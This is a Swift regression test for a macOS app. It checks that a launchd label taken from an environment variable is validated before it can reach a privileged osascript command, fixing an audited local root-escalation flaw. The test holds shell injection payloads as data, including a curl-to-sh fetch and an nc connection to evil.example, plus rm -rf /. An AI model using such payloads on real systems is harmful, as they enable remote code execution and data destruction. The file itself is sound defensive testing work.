import Foundation

/// C1 (security audit): ZSC_CONTROL_DEV_LABEL flowed unescaped into
/// privileged `osascript ... with administrator privileges` shell strings
/// — any unprivileged local process could `launchctl setenv` an injection
/// payload and get root code execution the next time the victim clicked
/// Start/Stop and entered their own password. Locks in that AgentTarget
/// now rejects anything outside a real launchd label's charset and falls
/// back to the production label instead of passing attacker input through.
func runAgentTargetTests(_ t: TestRunner) {
    let envKey = "ZSC_CONTROL_DEV_LABEL"
    let original = ProcessInfo.processInfo.environment[envKey]
    defer {
        if let original {
            setenv(envKey, original, 1)
        } else {
            unsetenv(envKey)
        }
    }

    t.run("label falls back to production when no override is set") {
        unsetenv(envKey)
        t.expectEqual(AgentTarget.label, AgentTarget.productionLabel)
    }

    t.run("label accepts a real, valid devtest label") {
        setenv(envKey, "cc.zeroserver.control-devtest", 1)
        t.expectEqual(AgentTarget.label, "cc.zeroserver.control-devtest")
    }

    let injectionPayloads = [
        "cc.zeroserver.agent; curl -s https://evil.example/x.sh | sh #",
        "cc.zeroserver.agent`whoami`",
        "cc.zeroserver.agent$(id)",
        "cc.zeroserver.agent && rm -rf /",
        "cc.zeroserver.agent|nc evil.example 4444",
        "cc.zeroserver.agent\" ; echo pwned ; echo \"",
        "",
        String(repeating: "a", count: 300),
    ]

    for payload in injectionPayloads {
        t.run("label rejects injection payload and falls back to production: \(payload.prefix(40))") {
            setenv(envKey, payload, 1)
            t.expectEqual(AgentTarget.label, AgentTarget.productionLabel, "malicious/invalid env var must never reach a privileged shell string")
            // Also verify the derived plist path / service target - the
            // actual strings that get interpolated into the privileged
            // osascript command - stay pinned to production too.
            t.expectEqual(AgentTarget.plistPath, "/Library/LaunchDaemons/\(AgentTarget.productionLabel).plist")
            t.expectEqual(AgentTarget.serviceTarget, "system/\(AgentTarget.productionLabel)")
        }
    }
}
